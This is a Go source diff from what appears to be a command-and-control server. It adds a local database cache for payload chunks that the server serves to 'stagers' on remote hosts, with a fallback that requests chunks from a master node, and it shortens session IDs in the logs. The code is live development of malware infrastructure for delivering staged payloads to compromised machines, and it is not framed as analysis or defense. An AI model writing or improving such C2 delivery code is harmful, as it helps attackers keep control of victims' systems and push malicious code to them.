@@ -1451,8 +1451,23 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 		logf("[C2] CHUNK request: index=%d, stager_ip=%s, session_id=%s", chunkIndex, stagerIP, sessionID)
 	}
 
-	// In distributed mode, request chunk from Master
+	// In distributed mode, check cache first, then request from Master
 	if masterClient != nil {
+		// Try local cache first (instant response!)
+		if c2.db != nil {
+			cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
+			if err == nil && cachedChunk != "" {
+				if !isDuplicate {
+					logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID[:16])
+				}
+				return fmt.Sprintf("CHUNK|%s", cachedChunk)
+			}
+			// Cache miss - will query Master below
+			if !isDuplicate {
+				logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID[:16])
+			}
+		}
+
 		chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
 		if err != nil {
 			if !isDuplicate {
@@ -1461,9 +1476,18 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 			return "ERROR|CHUNK_UNAVAILABLE"
 		}
 
+		// Cache the chunk for future requests (fire and forget)
+		if c2.db != nil {
+			go func(sid string, idx int, data string) {
+				if err := c2.db.CacheChunk(sid, idx, data); err != nil {
+					logf("[C2] Warning: Failed to cache chunk %d: %v", idx, err)
+				}
+			}(sessionID, chunkIndex, chunkResp.ChunkData)
+		}
+
 		if !isDuplicate {
 			logf("[C2] Serving chunk %d/%d for stager %s (session: %s)",
-				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID)
+				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID[:16])
 		}
 
 		// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
